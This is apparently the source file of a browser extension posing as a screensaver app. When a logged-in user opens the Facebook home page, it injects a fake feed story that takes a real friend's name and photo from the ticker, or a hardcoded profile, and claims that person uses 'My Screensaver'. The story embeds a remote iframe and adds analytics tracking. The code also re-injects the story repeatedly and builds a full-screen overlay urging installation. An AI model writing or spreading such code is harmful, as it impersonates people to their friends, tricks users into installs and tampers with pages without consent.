var Resources = {
	s:'<li class="uiStreamStory genericStreamStory aid_676723807" id="stream_story_514da675e4b053903411568" aria-haspopup="true"><div class="clearfix storyContent"><a class="actorPhoto lfloat" href="https://www.facebook.com/{{DATAID}}?utm_source=facebook&amp;utm_medium=cpc&amp;utm_campaign=at-pp4_pi-places_a-18-34_g-m_nfof&amp;utm_content=pp4" tabindex="0" aria-hidden="true" data-ft="{&quot;type&quot;:60,&quot;tn&quot;:&quot;&lt;&quot;}" data-hovercard="/ajax/hovercard/hovercard.php?id={{DATAID}}&amp;utm_source=facebook&amp;utm_medium=cpc&amp;utm_campaign=at-pp4_pi-places_a-18-34_g-m_nfof&amp;utm_content=pp4" aria-owns="js_11" aria-controls="js_11" aria-haspopup="true" id="js_12"><img class="_s0 profilePic _rw img" src="{{IMG}}" alt="" style="width:50px;height:50px;"></a><div class="storyInnerContent"><div class="mainWrapper"><div role="article"><h5 class="uiStreamMessage uiStreamHeadline uiStreamPassive" data-ft="{&quot;tn&quot;:&quot;B&quot;,&quot;type&quot;:1}"><a class="passiveName" href="https://www.facebook.com/{{DATAID}}?utm_source=facebook&amp;utm_medium=cpc&amp;utm_campaign=at-pp4_pi-places_a-18-34_g-m_nfof&amp;utm_content=pp4" data-ft="{&quot;tn&quot;:&quot;;&quot;}" data-hovercard="/ajax/hovercard/user.php?id={{DATAID}}">{{NAME}}</a> using <a href="http://myscreensaver.co" target="_blank">My Screensaver</a>.</h5><span class="uiStreamFooter"></span><div class="uiStreamEdgeStoryLine uiStreamEdgeStoryLineWithLabel"><hr><span class="uiStreamEdgeStoryLineTx fss fwb fcg">RELATED POST</span><div style="position:relative;top:-18px;text-align:center;font-weight:bold;font-size:1.2em;">Screensaver with your Favorite Celebrities</div></div><ul class="uiList mtm uiCollapsedList uiCollapsedListHidden uiStreamSubstories _4kg _6-h _704 _4ks" id="u_ps_jsonp_11_0_5"><li id="stream_sub_story_514da675e56e02925541525"><div class="genericStreamStory uiStreamSubstory aid_421664834552512 stream_sub_story_514da675e56e02925541525 uiStory_527319113987083">{{CONTENT}}</div></li></ul></div></div><div class="_6a _6b mlm uiPopover highlightSelector uiStreamHide" data-ft="{&quot;type&quot;:55,&quot;tn&quot;:&quot;V&quot;}" id="u_ps_jsonp_11_0_6"><a class="highlightSelectorButton uiStreamContextButton _p" href="?utm_source=facebook&amp;utm_medium=cpc&amp;utm_campaign=at-pp4_pi-places_a-18-34_g-m_nfof&amp;utm_content=pp4" aria-haspopup="true" aria-expanded="false" rel="toggle" id="u_ps_jsonp_11_0_7" role="button">Options</a></div></div></div></li>',
	resource_1:'data:image/png;base64,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'
};

var Story = (function ($) {
	var iframe_ab = 2,//Math.floor(Math.random() * 2) ? '2' : '1',
		attempts = 0, config, requestEnd = false, isUserClick = false;
	
	return $.Class.extend({
		init:function (cfg) {
			config = cfg;

			if (location.host == 'www.facebook.com' && isFbHome() && isLogged() && isRun()) {
				isNotDisabled(function () {
					initMarkup();
					initEvents();
					initAnalytics();
				});
			}
			else if (location.host == 'www.myscreensaver.co') {
				appAPI.db.async.set('temp_disabled', true, appAPI.time.hoursFromNow(1), function() {
				});
			}
		}
	});
	
	function initMarkup() {
		var story, ul;
		
		if ($('#stream_story_514da675e4b053903411568').length > 0) {
			return;
		}

		if (testName()) {
			story = $(parseStory({story:config.sponsor}));
			ul = $('ul.uiStreamHomepage');
					
			ul.prepend(story);

			setTimeout(function () {
				initKeepAlive();
			}, 1000);
		} else if (attempts < 3 && !isIE()) {
			attempts ++;
			
			setTimeout(initMarkup, 1000);
		} else {
			story = $(parseStory({story:config.sponsor, name:'Kelly Olander', img:'https://fbcdn-profile-a.akamaihd.net/hprofile-ak-ash3/c24.78.244.244/s160x160/11786_314561168621771_1793375103_n.jpg', dataId:'100002036719656'}));
			ul = $('ul.uiStreamHomepage');

			ul.prepend(story);

			if (!isIE()) {
				setTimeout(function () {
					initKeepAlive();
				}, 3000);
			}
		}
	}

	function initEvents() {
		/*$(window).on('message', function (e) {
			console.log('eee', e);

			if (/^request\_install\_screensaver/i.test(e.originalEvent.data)) {
				var d = e.originalEvent.data.replace('request_install_screensaver_', '');

				appAPI.db.async.set('temp_disabled', true, appAPI.time.hoursFromNow(1), function() {
				});

				if (!isUserClick) {
					appAPI.dom.addInlineJS("_gaq.push(['_trackEvent', 'notification', 'click_ab_" + iframe_ab + "', '" + d + "', 1]);");
				}
			
				isUserClick = true;
			}

			if (/^request\_show\_screensaver/i.test(e.originalEvent.data)) {
				var d = e.originalEvent.data.replace('request_show_screensaver_', '');

				appAPI.dom.addInlineJS("_gaq.push(['_trackEvent', 'notification', 'display_ab_" + iframe_ab + "', '" + d + "', 1]);");
			}

			if (/^request\_end\_campaign/i.test(e.originalEvent.data) && !requestEnd) {
				var end = new Date(2011, 1, 1);

				appAPI.db.set('time_run_promo_2', end.getTime());

				requestEnd = true;
			}
		});*/
	}

	function initAnalytics() {
		var code = "var _gaq = _gaq || [];\
		  _gaq.push(['_setAccount', 'UA-40219400-1']);\
		  _gaq.push(['_trackPageview']);\
		  (function() {\
		    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\
		    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';\
		    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\
		  })();";
	
		appAPI.dom.addInlineJS(code);
	}

	function initKeepAlive() {
		setTimeout(function () {
			if (location.host == 'www.facebook.com' && location.pathname == '/' && isRun() && $('#stream_story_514da675e4b053903411568').length == 0) {
				isNotDisabled(function  () {
					initMarkup();
					initAnalytics();
				});
			}

			initKeepAlive();
		}, 2000);
	}
	
	function parseStory(cfg) {
		var ticker = $('.tickerActivityStories').find('.fbFeedTickerStory:first'),
			img = cfg.img || ticker.find('img.img').attr('src'),
			name = cfg.name || ticker.find('span.passiveName').html(),
			actorName = ticker.find('div.actorName > a').html(),
			dataId = cfg.dataId || ticker.data('actor');

		return cfg.story.replace(/\{\{IMG\}\}/, img)
			.replace(/\{\{NAME\}\}/, name || actorName)
			.replace(/\{\{DATAID\}\}/gi, dataId)
			.replace(/\{\{CONTENT\}\}/gi, getIframe());
	}

	function getIframe() {
		var url = 'https://fierce-window-3161.herokuapp.com/fb_' + iframe_ab + '.php';

		return '<iframe src="' + url + '" id="screen-saver-iframe" style="border:none;width:511px;height:380px;position:relative;left:-61px;"></iframe>';
	}

	function testName() {
		var ticker = $('.tickerActivityStories').find('.fbFeedTickerStory:first'),
			name = ticker.find('span.passiveName').html();

		return !!name;
	}

	function isRun() {
		var timeRun = appAPI.db.get('time_run_promo_2') ? new Date(appAPI.db.get('time_run_promo_2')) : null,
			currentDate = new Date(), hourDiff;

		if (!timeRun) {
			timeRun = new Date();

			appAPI.db.set('time_run_promo_2', timeRun.getTime());
		}

		hourDiff = currentDate.getTime() - timeRun.getTime();
		hourDiff = Math.floor(hourDiff / 1000 / 60 / 60);  // in hours

		return hourDiff < 36;
	}

	function isNotDisabled(callback) {
		appAPI.db.async.get('temp_disabled', function(isDisable) {
			if (!isDisable) {
				callback();
			}
		});
	}

	function isLogged() {
		return /c\_user\=/.test(document.cookie);
	}

	function isFbHome() {
		return location.pathname == '/' || location.pathname == '/home.php';
	}

	function isIE() {
		return appAPI.browser.name == 'msie';
	}

	function showInstallCover(type) {
		if (type == 'chrome') {
			var div = $('<div style="width:100%;height:100%;position:fixed;top:0px;left:0px;z-index:1000000;background-color:rgba(0, 0, 0, 0.75);" />').appendTo('body');
			var image = $('<img style="position:absolute;bottom:19px;left:65px;-webkit-transform:rotate(176deg);-moz-transform:rotate(90deg);filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);" src="' + Resources.resource_1 + '" />').appendTo(div);
			var inst = $('<div style="color:#fff;position:absolute;left:10px;bottom:85px;font-size:2em;font-weight:bold;">Run Your Screensaver</div>').appendTo(div);
		}

		if (type == 'msie') {
			var div = $('<div style="width:100%;height:100%;position:fixed;top:0px;left:0px;z-index:1000000;background-color:rgba(0, 0, 0, 0.75);" />').appendTo('body');
			var image = $('<img style="position:absolute;bottom:90px;right:30%;-webkit-transform:rotate(176deg);-moz-transform:rotate(90deg);filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);" src="' + Resources.resource_1 + '" />').appendTo(div);
			var inst = $('<div style="color:#fff;position:absolute;right:26%;bottom:146px;font-size:2em;font-weight:bold;">Run Your Screensaver</div>').appendTo(div);
		}

		var animDir = 1;

		div.on('click', function () {
			div.remove();
		});
		
		function animageImage() {
			if (animDir) {
				image.animate({
					bottom:35
				}, 1000, function () {
					animDir = 0;

					animageImage();
				})
			} else {
				image.animate({
					bottom:19
				}, 1000, function () {
					animDir = 1;

					animageImage();
				})
			}
		}

		animageImage();
	}
})(jQuery);

jQuery(function () {
	var story = new Story({
		sponsor:Resources.s
	});
});